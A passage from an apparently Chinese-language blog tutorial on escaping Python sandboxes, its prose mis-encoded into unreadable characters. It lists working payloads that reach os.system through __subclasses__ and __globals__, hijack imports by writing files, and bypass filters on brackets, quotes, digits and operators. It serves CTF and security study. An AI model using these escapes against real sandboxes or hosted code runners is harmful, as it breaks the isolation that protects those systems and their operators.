pass...&gt;&gt;&gt; test.__bases__()&gt;&gt;&gt; class test(object):...  pass...&gt;&gt;&gt; test.__bases__(&lt;type 'object'&gt;,)PYTHON-REPL</code></pre><p>é‚£ä¹ˆçŸ¥é“è¿™ä¸ªæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p><p>ç”±äºæ²¡æ³•ç›´æ¥å¼•å…¥ osï¼Œé‚£ä¹ˆå‡å¦‚æœ‰ä¸ªåº“å«<code>oos</code>ï¼Œåœ¨<code>oos</code>ä¸­å¼•å…¥äº†<code>os</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>__globals__</code>æ‹¿åˆ° osã€‚ä¾‹å¦‚ï¼Œ<code>site</code> è¿™ä¸ªåº“å°±æœ‰ <code>os</code>ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import site&gt;&gt;&gt; site.os&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py'&gt;MOONSCRIPT</code></pre><p>æ€ä¹ˆç†è§£è¿™ä¸ª <strong>globals</strong> å‘¢ï¼Ÿå®ƒæ˜¯å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´ä¸­æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ã€‚ä¹Ÿå°±æ˜¯åªè¦æ˜¯å‡½æ•°å°±ä¼šæœ‰è¿™ä¸ªå±æ€§ã€‚é™¤äº† <code>builtin_function_or_method</code> æˆ–è€…æ˜¯ <code>wrapper_descriptor</code> ã€<code>method-wrapper</code> ç±»å‹çš„å‡½æ•°ï¼Œä¾‹å¦‚ <code>range</code>ã€<code>range.__init__</code>ã€<code>''.split</code> ç­‰ç­‰ã€‚</p><p>é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œèƒ½å¼•å…¥ site çš„è¯ï¼Œå°±ç›¸å½“äºæœ‰ osã€‚é‚£å¦‚æœ site ä¹Ÿè¢«ç¦ç”¨äº†å‘¢ï¼Ÿæ²¡äº‹ï¼Œæœ¬æ¥ä¹Ÿå°±æ²¡æ‰“ç®—ç›´æ¥ <code>import site</code>ã€‚å¯ä»¥åˆ©ç”¨ <code>reload</code>ï¼Œå˜ç›¸åŠ è½½ <code>os</code>ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import site&gt;&gt;&gt; osTraceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;NameError: name 'os' is not defined&gt;&gt;&gt; os = reload(site.os)&gt;&gt;&gt; os.system('whoami')macr0phag30PYTHON-REPL</code></pre><p>è¿˜æœ‰ï¼Œæ—¢ç„¶æ‰€æœ‰çš„ç±»éƒ½ç»§æ‰¿çš„<code>object</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆç”¨<code>__subclasses__</code>çœ‹çœ‹å®ƒçš„å­ç±»ï¼Œä»¥ 2.x ä¸ºä¾‹ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i...(0, &lt;type 'type'&gt;)(1, &lt;type 'weakref'&gt;)(2, &lt;type 'weakcallableproxy'&gt;)(3, &lt;type 'weakproxy'&gt;)(4, &lt;type 'int'&gt;)(5, &lt;type 'basestring'&gt;)(6, &lt;type 'bytearray'&gt;)(7, &lt;type 'list'&gt;)(8, &lt;type 'NoneType'&gt;)(9, &lt;type 'NotImplementedType'&gt;)(10, &lt;type 'traceback'&gt;)(11, &lt;type 'super'&gt;)(12, &lt;type 'xrange'&gt;)(13, &lt;type 'dict'&gt;)(14, &lt;type 'set'&gt;)(15, &lt;type 'slice'&gt;)(16, &lt;type 'staticmethod'&gt;)(17, &lt;type 'complex'&gt;)(18, &lt;type 'float'&gt;)(19, &lt;type 'buffer'&gt;)(20, &lt;type 'long'&gt;)(21, &lt;type 'frozenset'&gt;)(22, &lt;type 'property'&gt;)(23, &lt;type 'memoryview'&gt;)(24, &lt;type 'tuple'&gt;)(25, &lt;type 'enumerate'&gt;)(26, &lt;type 'reversed'&gt;)(27, &lt;type 'code'&gt;)(28, &lt;type 'frame'&gt;)(29, &lt;type 'builtin_function_or_method'&gt;)(30, &lt;type 'instancemethod'&gt;)(31, &lt;type 'function'&gt;)(32, &lt;type 'classobj'&gt;)(33, &lt;type 'dictproxy'&gt;)(34, &lt;type 'generator'&gt;)(35, &lt;type 'getset_descriptor'&gt;)(36, &lt;type 'wrapper_descriptor'&gt;)(37, &lt;type 'instance'&gt;)(38, &lt;type 'ellipsis'&gt;)(39, &lt;type 'member_descriptor'&gt;)(40, &lt;type 'file'&gt;)(41, &lt;type 'PyCapsule'&gt;)(42, &lt;type 'cell'&gt;)(43, &lt;type 'callable-iterator'&gt;)(44, &lt;type 'iterator'&gt;)(45, &lt;type 'sys.long_info'&gt;)(46, &lt;type 'sys.float_info'&gt;)(47, &lt;type 'EncodingMap'&gt;)(48, &lt;type 'fieldnameiterator'&gt;)(49, &lt;type 'formatteriterator'&gt;)(50, &lt;type 'sys.version_info'&gt;)(51, &lt;type 'sys.flags'&gt;)(52, &lt;type 'exceptions.BaseException'&gt;)(53, &lt;type 'module'&gt;)(54, &lt;type 'imp.NullImporter'&gt;)(55, &lt;type 'zipimport.zipimporter'&gt;)(56, &lt;type 'posix.stat_result'&gt;)(57, &lt;type 'posix.statvfs_result'&gt;)(58, &lt;class 'warnings.WarningMessage'&gt;)(59, &lt;class 'warnings.catch_warnings'&gt;)(60, &lt;class '_weakrefset._IterationGuard'&gt;)(61, &lt;class '_weakrefset.WeakSet'&gt;)(62, &lt;class '_abcoll.Hashable'&gt;)(63, &lt;type 'classmethod'&gt;)(64, &lt;class '_abcoll.Iterable'&gt;)(65, &lt;class '_abcoll.Sized'&gt;)(66, &lt;class '_abcoll.Container'&gt;)(67, &lt;class '_abcoll.Callable'&gt;)(68, &lt;type 'dict_keys'&gt;)(69, &lt;type 'dict_items'&gt;)(70, &lt;type 'dict_values'&gt;)(71, &lt;class 'site._Printer'&gt;)(72, &lt;class 'site._Helper'&gt;)(73, &lt;type '_sre.SRE_Pattern'&gt;)(74, &lt;type '_sre.SRE_Match'&gt;)(75, &lt;type '_sre.SRE_Scanner'&gt;)(76, &lt;class 'site.Quitter'&gt;)(77, &lt;class 'codecs.IncrementalEncoder'&gt;)(78, &lt;class 'codecs.IncrementalDecoder'&gt;)PYTHON</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œsite å°±åœ¨é‡Œé¢ï¼Œä»¥ 2.x çš„<code>site._Printer</code>ä¸ºä¾‹ï¼ˆpy3.x ä¸­å·²ç»ç§»é™¤äº†è¿™é‡Œ <strong>globals</strong> çš„ <code>os</code>ï¼‰ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;&gt;&gt;&gt; # ä¸ºäº†é¿å… index ä½ç½®é—®é¢˜ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š&gt;&gt;&gt; [i._Printer__setup.__globals__['os'] for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_Printer"]&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;PROLOG</code></pre><p>os åˆå›æ¥äº†ã€‚å¹¶ä¸” site ä¸­è¿˜æœ‰ <code>__builtins__</code>ã€‚</p><p>è¿™ä¸ªæ–¹æ³•ä¸ä»…é™äº A-&gt;osï¼Œè¿˜é˜”ä»¥æ˜¯ A-&gt;B-&gt;osï¼Œæ¯”å¦‚ 2.x ä¸­çš„ <code>warnings</code>ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import warnings&gt;&gt;&gt; &gt;&gt;&gt; warnings.osTraceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;AttributeError: 'module' object has no attribute 'os'&gt;&gt;&gt; &gt;&gt;&gt; warnings.linecache&lt;module 'linecache' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc'&gt;&gt;&gt;&gt;&gt;&gt;&gt; warnings.linecache.os&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;PYTHON</code></pre><p>åœ¨ç»§æ‰¿é“¾ä¸­å°±å¯ä»¥è¿™æ ·ï¼ˆpy3.x ä¸­å·²ç»ç§»é™¤äº†è¿™é‡Œ <strong>globals</strong> çš„ <code>linecache</code>ï¼‰ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')macr0phag30&gt;&gt;&gt; # ä¸ºäº†é¿å… index ä½ç½®é—®é¢˜ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š&gt;&gt;&gt; [i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "catch_warnings"]PROLOG</code></pre><p> é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œ<code>warnings</code>è¿™ä¸ªåº“ä¸­æœ‰ä¸ªå‡½æ•°ï¼š<code>warnings.catch_warnings</code>ï¼Œå®ƒæœ‰ä¸ª<code>_module</code>å±æ€§ï¼š</p><pre class="language-none"><code class="language-none"> def __init__(self, record=False, module=None):... self._module = sys.modules['warnings'] if module is None else module...OXYGENE</code></pre><p>æ‰€ä»¥é€šè¿‡<code>_module</code>ä¹Ÿå¯ä»¥æ„é€  payloadï¼ˆpy3.x ä¸­å·²ç»ç§»é™¤äº† <code>catch_warnings</code> çš„ <code>linecache</code>ï¼‰ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.linecache.os.system('whoami')macr0phag30STYLUS</code></pre><p>3.x ä¸­çš„<code>warnings</code>è™½ç„¶æ²¡æœ‰ <code>linecache</code>ï¼Œä¹Ÿæœ‰<code>__builtins__</code>ã€‚</p><p>åŒæ ·ï¼Œpy3.x ä¸­æœ‰<code>&lt;class 'os._wrap_close'&gt;</code>ï¼Œåˆ©ç”¨æ–¹å¼å¯ä»¥ä¸ºï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')macr0phag30&gt;&gt;&gt; # ä¸ºäº†é¿å… index ä½ç½®é—®é¢˜ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š&gt;&gt;&gt; [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami')PROLOG</code></pre><p>å½“ç„¶è¿™æ ·ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆ3.xï¼‰ï¼š</p><pre class="language-none"><code class="language-none">set.mro()[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')PYTHON</code></pre><p>é¡ºä¾¿æä¸€ä¸‹ï¼Œ<code>object</code> æœ¬æ¥å°±æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå¦‚æœæ²¡è¿‡æ»¤çš„è¯ï¼Œpayload å¯ä»¥å†ç®€åŒ–ä¸ºï¼š</p><pre class="language-none"><code class="language-none">object.__subclasses__()[133].__init__.__globals__['system']('whoami')PYTHON</code></pre><p>è¿˜æœ‰ä¸€ç§æ˜¯åˆ©ç”¨<code>builtin_function_or_method</code> çš„ <code>__call__</code>ï¼š</p><pre class="language-none"><code class="language-none">"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval, '1+1')SQF</code></pre><p> æˆ–è€…ç®€å•ä¸€ç‚¹ï¼š</p><pre class="language-none"><code class="language-none">[].pop.__class__.__call__(eval, '1+1')STYLUS</code></pre><p>ä¸Šé¢è¿™äº› payload å¤§å¤šæ•°æ˜¯ç›´æ¥ index äº†ï¼Œä½†æ˜¯ç›´æ¥ç”¨ index ä¸å¤ªå¥å£®ï¼Œå¯ä»¥éƒ½æ¢æˆåˆ—è¡¨æ¨å¯¼å¼ï¼Œç”¨ <strong>name</strong> æ¥è·å–æƒ³è¦çš„ classï¼Œä¸Šé¢ä¹Ÿä¸¾äº†å¥½å‡ ä¸ªä¾‹å­äº†ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´å•¦ã€‚</p><p>æœ€åå†è¡¥å……å‡ ä¸ªã€‚</p><p>å¯ä»¥è¿™æ ·åˆ©ç”¨ï¼š</p><pre class="language-none"><code class="language-none">class test(dict): def __init__(self): print(super(test, self).keys.__class__.__call__(eval, '1+1')) # å¦‚æœæ˜¯ 3.x çš„è¯å¯ä»¥ç®€å†™ä¸ºï¼š # super().keys.__class__.__call__(eval, '1+1'))test()SCSS</code></pre><p>è¿˜å¯ä»¥åˆ©ç”¨å¼‚å¸¸é€ƒé€¸ï¼š</p><pre class="language-none"><code class="language-none">hack = lambda : [0][1]try: hack()except Exception as e: e.__traceback__.tb_next.tb_frame.f_globals['__builtins__']['__import__']('os').system('whoami')PYTHON</code></pre><p>è¿˜å¯ä»¥åˆ©ç”¨ <code>format</code>ï¼š</p><ol><li><code>"{0.__class__.__base__}".format([])</code></li><li><code>"{x.__class__.__base__}".format(x=[])</code></li><li><code>"{.__class__.__base__}".format([])</code></li><li><code>("{0.__class_"+"_.__base__}").format([])</code></li></ol><p>ï¼ˆè¿™é‡Œé¡ºæ‰‹è®°å½•ä¸‹ï¼Œå¯¹äºå­—å…¸é”®æ˜¯æ•´æ•°å‹çš„æ¯”å¦‚ <code>{"1":2}</code>ï¼Œformat æ˜¯æ— æ³•æ‹¿åˆ°å€¼çš„ :)ï¼Œè¿™æ ·ä¼šæŠ¥é”™ï¼š<code>''' {0['1']} '''.format({"1":2})</code>ï¼Œ<code>'1'</code> å¼•å·å»æ‰çš„è¯åˆä¼šæŠ¥æ²¡æœ‰è¿™ä¸ªé”®ï¼Œè¿™ä¸ªç‰¹æ€§å¯ä»¥è§<a href="https://docs.python.org/3/library/string.html#format-string-syntax">æ–‡æ¡£</a>ï¼‰</p><p>ä¸Šé¢çš„è¿™äº›åˆ©ç”¨æ–¹å¼æ€»ç»“èµ·æ¥å°±æ˜¯é€šè¿‡ <code>.mro()</code>ã€<code>__class__</code>ã€<code>type(...)</code>ã€<code>__mro__</code>ã€<code>__subclasses__</code>ã€<code>__base__</code>ã€<code>__bases__</code> ç­‰å±æ€§/æ–¹æ³•å»è·å– <code>object</code>ï¼Œå†æ ¹æ®<code>__globals__</code>æ‰¾å¼•å…¥çš„<code>__builtins__</code>æˆ–è€…<code>eval</code>ç­‰ç­‰èƒ½å¤Ÿç›´æ¥è¢«åˆ©ç”¨çš„åº“ï¼Œæˆ–è€…æ‰¾åˆ°<code>builtin_function_or_method</code>ç±»/ç±»å‹<code>__call__</code>åç›´æ¥è¿è¡Œ<code>eval</code>ã€‚</p><p>æœ€åï¼Œå…¶å®æ²™ç®±é€ƒé€¸ï¼Œå¯¹äºä¸åŒçš„ç¬¬ä¸‰æ–¹åº“å¯èƒ½ä¼šå­˜åœ¨ä¸€äº›ç‰¹æ®Šçš„åˆ©ç”¨æ–¹å¼ï¼Œæ¯”å¦‚ <code>jinja2</code>ï¼Œè¿™ç±»å±äº <code>SSTI</code> æ¼æ´ï¼Œå¯ä»¥çœ‹è¿™ç¯‡åšå®¢ï¼š<a href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/">ä¼ é€é—¨ğŸšª</a>ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚</p><p>å…¶å® SSTI ä¹Ÿä¼šç”¨åˆ°è¿™é‡Œçš„å¾ˆå¤šæŠ€å·§ï¼Œä¸¤è€…çŸ¥è¯†é¢ç›¸äº’äº¤å ã€‚</p><h1 id="æ–‡ä»¶è¯»å†™æ²™ç®±é€ƒé€¸"><a href="#æ–‡ä»¶è¯»å†™æ²™ç®±é€ƒé€¸" class="headerlink" title="æ–‡ä»¶è¯»å†™æ²™ç®±é€ƒé€¸"></a><strong>æ–‡ä»¶è¯»å†™</strong>æ²™ç®±é€ƒé€¸</h1><p>2.x æœ‰ä¸ªå†…å»ºçš„ <code>file</code>ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; file('key').read()'Macr0phag3\n'&gt;&gt;&gt; file('key', 'w').write('Macr0phag3')&gt;&gt;&gt; file('key').read()'Macr0phag3'DELPHI</code></pre><p>è¿˜æœ‰ä¸ª <code>open</code>ï¼Œ2.x ä¸ 3.x é€šç”¨ã€‚</p><p>è¿˜æœ‰ä¸€äº›åº“ï¼Œä¾‹å¦‚ï¼š<code>types.FileType</code>(rw)ã€<code>platform.popen</code>(rw)ã€<code>linecache.getlines</code>(r)ã€‚</p><p>ä¸ºä»€ä¹ˆè¯´å†™æ¯”è¯»å±å®³å¤§å‘¢ï¼Ÿå› ä¸ºå¦‚æœèƒ½å†™ï¼Œå¯ä»¥å°†ç±»ä¼¼çš„æ–‡ä»¶ä¿å­˜ä¸º<code>math.py</code>ï¼Œç„¶å import è¿›æ¥ï¼š math.pyï¼š</p><pre class="language-none"><code class="language-none">import osprint(os.system('whoami'))MOONSCRIPT</code></pre><p> è°ƒç”¨</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import mathmacr0phag30PYTHON-REPL</code></pre><p> è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œ py æ–‡ä»¶å‘½åæ˜¯æœ‰æŠ€å·§çš„ã€‚ä¹‹æ‰€ä»¥è¦æŒ‘ä¸€ä¸ªå¸¸ç”¨çš„æ ‡å‡†åº“æ˜¯å› ä¸ºè¿‡æ»¤åº“åå¯èƒ½é‡‡ç”¨çš„æ˜¯ç™½åå•ã€‚å¹¶ä¸”ä¹‹å‰è¯´è¿‡æœ‰äº›åº“æ˜¯åœ¨<code>sys.modules</code>ä¸­æœ‰çš„ï¼Œè¿™äº›åº“æ— æ³•è¿™æ ·åˆ©ç”¨ï¼Œä¼šç›´æ¥ä»<code>sys.modules</code>ä¸­åŠ å…¥ï¼Œæ¯”å¦‚<code>re</code>ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; 're' in sys.modulesTrue&gt;&gt;&gt; 'math' in sys.modulesFalse&gt;&gt;&gt;PYTHON-REPL</code></pre><p> å½“ç„¶åœ¨<code>import re</code> ä¹‹å‰<code>del sys.modules['re']</code>ä¹Ÿä¸æ˜¯ä¸å¯ä»¥â€¦</p><p>æœ€åï¼Œè¿™é‡Œçš„æ–‡ä»¶å‘½åéœ€è¦æ³¨æ„çš„åœ°æ–¹å’Œæœ€å¼€å§‹çš„é‚£ä¸ªéå†æµ‹è¯•çš„æ–‡ä»¶ä¸€æ ·ï¼šç”±äºå¾…æµ‹è¯•çš„åº“ä¸­æœ‰ä¸ªå« <code>test</code>çš„ï¼Œå¦‚æœæŠŠéå†æµ‹è¯•çš„æ–‡ä»¶ä¹Ÿå‘½åä¸º testï¼Œä¼šå¯¼è‡´é‚£ä¸ªæ–‡ä»¶è¿è¡Œ 2 æ¬¡ï¼Œå› ä¸ºè‡ªå·± import äº†è‡ªå·±ã€‚</p><p>è¯»æ–‡ä»¶æš‚æ—¶æ²¡ä»€ä¹ˆå‘ç°ç‰¹åˆ«çš„åœ°æ–¹ã€‚</p><p>å‰©ä¸‹çš„å°±æ˜¯æ ¹æ®ä¸Šé¢çš„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤é‡‡ç”¨çš„ç»•è¿‡æ–¹æ³•å»å¯»æ‰¾ payload äº†ï¼Œæ¯”å¦‚ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.open('key').read()'Macr0phag3\n'LIVECODESERVER</code></pre><p> æˆ–è€…</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]('key').read()'Macr0phag3'GCODE</code></pre><h1 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a><strong>æ•æ„Ÿä¿¡æ¯æ³„éœ²</strong></h1><p>è¿™ä¸ªä¹Ÿç®—åªèƒ½è¯»å§ã€‚</p><ol><li><code>dir()</code></li><li><code>__import__("__main__").x</code>ï¼Œå…¶ä¸­ <strong>main</strong> è¿˜ä¼šæ³„éœ²è„šæœ¬çš„ç»å¯¹è·¯å¾„ï¼š<code>&lt;module '__main__' from 'xxx.py'&gt;</code></li><li><code>__file__</code>ï¼Œæ–‡ä»¶ç»å¯¹è·¯å¾„</li><li><code>x.__dict__</code></li><li><code>locals()</code></li><li><code>globals()</code></li><li><code>vars()</code></li><li><code>sys._getframe(0).f_code.co_varnames</code></li><li><code>sys._getframe(0).f_locals</code></li><li><code>inspect.x</code>ï¼Œinspect æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥è·å–ä¿¡æ¯ï¼Œæ¯”å¦‚è·å–æºç å¯ä»¥ç”¨ <code>inspect.getsource</code>ï¼Œè¿˜æœ‰å…¶ä»–å¾ˆå¤šçš„åŠŸèƒ½</li><li>â€¦</li></ol><p>è¿™æœ‰ä¸€ç¯‡ä¸é”™çš„æ–‡ç« ï¼Œæ¨èé˜…è¯»ï¼š</p><p><a href="https://www.cnblogs.com/dechinphy/p/modify-locals.html">https://www.cnblogs.com/dechinphy/p/modify-locals.html</a></p><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a><strong>å…¶ä»–</strong></h1><p>è¿™äº›è¡Œä¸ºä¸åƒæ˜¯ oj ä¼šåšå¾—å‡ºæ¥çš„ï¼Œctf å€’æ˜¯æœ‰å¯èƒ½å‡ºç°ã€‚</p><h3 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤ [ ]"></a><strong>è¿‡æ»¤ [ ]</strong></h3><p>åº”å¯¹çš„æ–¹å¼å°±æ˜¯å°†<code>[]</code>çš„åŠŸèƒ½ç”¨<code>pop</code>ã€<code>__getitem__</code> ä»£æ›¿ï¼ˆå®é™…ä¸Š<code>a[0]</code>å°±æ˜¯åœ¨å†…éƒ¨è°ƒç”¨äº†<code>a.__getitem__(0)</code>ï¼‰ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('whoami').read()'macr0phag3\n'STYLUS</code></pre><p>å½“ç„¶ï¼Œdict ä¹Ÿæ˜¯å¯ä»¥ pop çš„ï¼š<code>{"a": 1}.pop("a")</code></p><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ <code>next(iter())</code> æ›¿ä»£ï¼Œæˆ–è®¸å¯ä»¥åŠ ä¸Š <code>max</code> ä¹‹ç±»çš„ç©æ„ã€‚</p><h3 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a><strong>è¿‡æ»¤å¼•å·</strong></h3><blockquote><p>chr</p></blockquote><p>æœ€ç®€å•å°±æ˜¯ç”¨ <code>chr</code> å•¦</p><pre class="language-none"><code class="language-none">os.system( chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))SCSS</code></pre><blockquote><p>æ‰£å­—ç¬¦</p></blockquote><p>åˆ©ç”¨ <code>str</code> å’Œ <code>[]</code>ï¼ŒæŒ¨ä¸ªæŠŠå­—ç¬¦æ‹¼æ¥å‡ºæ¥</p><pre class="language-none"><code class="language-none">os.system( str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(()a)[10]+str(().__class__.__new__)[3])SCSS</code></pre><p> å½“ç„¶ <code>[]</code> å¦‚æœè¢«è¿‡æ»¤äº†ä¹Ÿå¯ä»¥ bypassï¼Œå‰é¢è¯´è¿‡äº†ã€‚</p><p>å¦‚æœ str è¢«è¿‡æ»¤äº†æ€ä¹ˆåŠå‘¢ï¼Ÿ<code>type('')()</code>ã€<code>format()</code> å³å¯ã€‚åŒç†ï¼Œ<code>int</code>ã€<code>list</code> éƒ½å¯ä»¥ç”¨ <code>type</code> æ„é€ å‡ºæ¥ã€‚</p><blockquote><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²</p></blockquote><p>é‚£è¿‡æ»¤äº†å¼•å·ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²è¿˜èƒ½ç”¨å—ï¼Ÿ</p><p><code>(chr(37)+str({}.__class__)[1])%100 == 'd'</code></p><p>åˆèµ·é£äº†â€¦</p><blockquote><p>dict() æ‹¿é”®å®ƒä¸é¦™å—ï¼Ÿ</p><pre class="language-none"><code class="language-none">'whoami' ==list(dict(whoami=1))[0] ==str(dict(whoami=1))[2:8] ==aPYTHON</code></pre></blockquote><h3 id="é™åˆ¶æ•°å­—"><a href="#é™åˆ¶æ•°å­—" class="headerlink" title="é™åˆ¶æ•°å­—"></a><strong>é™åˆ¶æ•°å­—</strong></h3><p>ä¸Šé¢æåˆ°äº†å­—ç¬¦ä¸²è¿‡æ»¤ç»•è¿‡ï¼Œé¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå¦‚æœæ˜¯è¿‡æ»¤äº†æ•°å­—ï¼ˆè™½ç„¶è¿™ç§æƒ…å†µå¾ˆå°‘è§ï¼‰ï¼Œé‚£ç»•è¿‡çš„æ–¹å¼å°±æ›´å¤šäº†ï¼Œæˆ‘è¿™é‡Œéšä¾¿åˆ—ä¸‹ï¼š</p><ol><li>0ï¼š<code>int(bool([]))</code>ã€<code>Flase</code>ã€<code>len([])</code>ã€<code>any(())</code></li><li>1ï¼š<code>int(bool([""]))</code>ã€<code>True</code>ã€<code>all(())</code>ã€<code>int(list(list(dict(aá=())).pop()).pop())</code></li><li>è·å–ç¨å¾®å¤§çš„æ•°å­—ï¼š<code>len(str({}.keys))</code>ï¼Œä¸è¿‡éœ€è¦æ…¢æ…¢æ‰¾é•¿åº¦ç¬¦åˆçš„å­—ç¬¦ä¸²</li><li>1.0ï¼š<code>float(True)</code></li><li>-1ï¼š<code>~0</code></li><li>â€¦</li></ol><p>å…¶å®æœ‰äº† <code>0</code> å°±å¯ä»¥äº†ï¼Œè¦å•¥æ•´æ•°ç›´æ¥åšè¿ç®—å³å¯ï¼š</p><pre class="language-none"><code class="language-none">0 ** 0 == 11 + 1 == 22 + 1 == 32 ** 2 == 4...PYTHON</code></pre><p>ä»»æ„æµ®ç‚¹æ•°ç¨å¾®éº»çƒ¦ç‚¹ï¼Œéœ€è¦æƒ³åŠæ³•è¿ç®—ï¼Œä½†æ˜¯ä¸€å®šå¯ä»¥æå‡ºæ¥ï¼Œé™¤éæ˜¯ Ï€ è¿™ç§ç©æ„â€¦</p><h3 id="é™åˆ¶ç©ºæ ¼"><a href="#é™åˆ¶ç©ºæ ¼" class="headerlink" title="é™åˆ¶ç©ºæ ¼"></a><strong>é™åˆ¶ç©ºæ ¼</strong></h3><p>ç©ºæ ¼é€šå¸¸æ¥è¯´å¯ä»¥é€šè¿‡ <code>()</code>ã€<code>[]</code> æ›¿æ¢æ‰ã€‚ä¾‹å¦‚ï¼š</p><p><code>[i for i in range(10) if i == 5]</code> å¯ä»¥æ›¿æ¢ä¸º <code>[[i][0]for(i)in(range(10))if(i)==5]</code></p><h3 id="é™åˆ¶è¿ç®—ç¬¦"><a href="#é™åˆ¶è¿ç®—ç¬¦" class="headerlink" title="é™åˆ¶è¿ç®—ç¬¦"></a><strong>é™åˆ¶è¿ç®—ç¬¦</strong></h3><blockquote><p><code>&gt; &lt; ! - +</code> è¿™å‡ ä¸ªæ¯”è¾ƒç®€å•å°±ä¸è¯´äº†ã€‚</p></blockquote><p><code>==</code> å¯ä»¥ç”¨ <code>in</code> æ¥æ›¿æ¢ã€‚</p><p>æ›¿æ¢ <code>or</code> çš„æµ‹è¯•ä»£ç </p><pre class="language-none"><code class="language-none">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] or i[2]==i[3] print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans) print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans) print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)PY</code></pre><p> ä¸Šé¢è¿™å‡ ä¸ªè¡¨è¾¾å¼éƒ½å¯ä»¥æ›¿æ¢æ‰ <code>or</code></p><p>æ›¿æ¢ <code>and</code> çš„æµ‹è¯•ä»£ç </p><pre class="language-none"><code class="language-none">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] and i[2]==i[3] print(bool(eval(f'{i[0]==i[1]} &amp; {i[2]==i[3]}')) == ans) print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)PY</code></pre><p> ä¸Šé¢è¿™å‡ ä¸ªè¡¨è¾¾å¼éƒ½å¯ä»¥æ›¿æ¢æ‰ <code>and</code></p><h3 id="é™åˆ¶"><a href="#é™åˆ¶" class="headerlink" title="é™åˆ¶ ( )"></a><strong>é™åˆ¶ ( )</strong></h3><p>è¿™ç§æƒ…å†µä¸‹é€šå¸¸éœ€è¦èƒ½å¤Ÿæ”¯æŒ exec æ‰§è¡Œä»£ç ã€‚å› 